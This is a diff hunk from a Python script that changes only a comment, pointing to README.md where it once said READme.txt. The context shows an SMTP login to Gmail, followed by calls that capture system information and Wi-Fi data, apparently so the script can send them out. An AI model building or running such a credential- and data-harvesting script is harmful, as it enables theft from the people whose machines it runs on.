@@ -29,7 +29,7 @@ def systeminfo_captured():
 def main():
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login('username@gmail.com', 'password') #don't use you gmail password, read READme.txt file first 
+    server.login('username@gmail.com', 'password') #don't use you gmail password, read README.md file first 
 
     systeminfo: str = systeminfo_captured()
     capturewifi: str = capture_wifi()
